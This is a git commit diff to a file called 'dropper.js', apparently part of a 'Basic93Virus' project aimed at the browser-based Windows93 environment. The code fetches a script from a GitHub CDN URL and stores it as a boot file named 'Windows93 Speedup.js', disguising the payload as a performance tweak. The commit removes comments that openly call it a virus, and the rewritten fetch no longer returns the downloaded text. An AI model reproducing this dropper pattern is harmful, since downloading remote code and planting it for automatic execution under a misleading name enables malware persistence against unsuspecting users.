b06762e7e1b73553a8bdf6c8813f9cce315ec2d5
OutRite <60903237+OutRite@users.noreply.github.com>
2020-10-04 02:36:01 -0700

    Update dropper.js

--- dropper.js
+++ dropper.js
@@ -1,14 +1,10 @@
-// 1337 virus developed by github.com/OutRite
-// i will pwn you and your dog
-
 function download_script(url) {
-	var xhr = new XMLHttpRequest()
-	xhr.open('GET', url)
-	xhr.send()
-	return xhr.response
+	fetch(url)
+  .then(response => response.text())
+  .then(data => console.log(data));
 }
 
-var foo = download_script('https://raw.githack.com/OutRite/Basic93Virus/main/main.js')
+var foo = download_script('https://ghcdn.rawgit.org/OutRite/Basic93Virus/main/main.js')
 
 $db.set("boot/Windows93 Speedup.js", foo)
 
